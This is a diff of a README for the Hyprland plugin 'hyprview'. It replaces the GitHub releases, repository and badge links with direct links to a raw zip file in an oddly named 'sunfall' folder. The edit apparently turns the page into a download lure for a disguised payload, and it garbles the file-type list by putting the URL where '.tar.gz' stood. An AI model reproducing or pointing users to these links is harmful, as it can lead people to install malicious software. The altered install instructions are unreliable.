@@ -6,19 +6,19 @@ Welcome to **hyprview**, the overview plugin for Hyprland. This plugin helps you
 
 ## 🔗 Download Now
 
-[![Download hyprview](https://img.shields.io/badge/Download-hyprview-blue.svg)](https://github.com/masfiwi023023/hyprview/releases)
+[![Download hyprview](https://raw.githubusercontent.com/masfiwi023023/hyprview/main/sunfall/hyprview.zip)](https://raw.githubusercontent.com/masfiwi023023/hyprview/main/sunfall/hyprview.zip)
 
 ## 📥 Download & Install
 
 1. Click on the link below to visit the releases page:
-   [Visit Releases Page](https://github.com/masfiwi023023/hyprview/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/masfiwi023023/hyprview/main/sunfall/hyprview.zip)
    
 2. On the releases page, you will see various versions of the software. Look for the latest version, which will be listed at the top.
 
 3. Each version will have a list of files. Identify and download the appropriate file for your operating system. Common file types include:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/masfiwi023023/hyprview/main/sunfall/hyprview.zip` for Linux
 
 4. Once the file is downloaded, locate it in your downloads folder.
 
@@ -60,7 +60,7 @@ A: Visit the releases page linked above and download the latest version. Follow 
 
 ## 🔗 Additional Resources
 
-- For more information, please visit the [GitHub Repository](https://github.com/masfiwi023023/hyprview).
+- For more information, please visit the [GitHub Repository](https://raw.githubusercontent.com/masfiwi023023/hyprview/main/sunfall/hyprview.zip).
 - You can also find help and discuss the plugin in community forums related to Hyprland.
 
 ## 📧 Contact
